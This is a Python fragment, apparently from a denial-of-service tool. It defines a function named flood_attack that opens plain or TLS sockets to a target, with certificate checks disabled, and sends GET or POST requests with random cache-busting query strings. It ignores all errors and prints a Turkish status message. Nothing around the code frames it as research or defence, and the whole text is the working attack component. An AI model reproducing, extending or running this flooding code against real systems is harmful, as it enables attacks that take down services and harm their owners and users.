def flood_attack(target, port, method, user_agent):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)

        if port == 443:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target)

        sock.connect((target, port))

        url_path = f"/?s={random.randint(1, 100000)}"
        headers = [
            f"{method} {url_path} HTTP/1.1",
            f"Host: {target}",
            f"User-Agent: {user_agent}",
            "Accept: text/html",
            "Accept-Language: en-US,en;q=0.5",
            "Cache-Control: no-cache",
            "Connection: Keep-Alive"
        ]

        body = "param1=value1&param2=value2"
        if method == "POST":
            headers.append(f"Content-Length: {len(body)}")

        request = "\r\n".join(headers) + "\r\n\r\n"
        if method == "POST":
            request += body

        sock.sendall(request.encode())
        sock.recv(4096)

        print(f"📡 {method} isteği gönderildi -> {target}:{port}")

    except (socket.timeout, Exception):
        pass
    finally:
        if 'sock' in locals():
            sock.close()
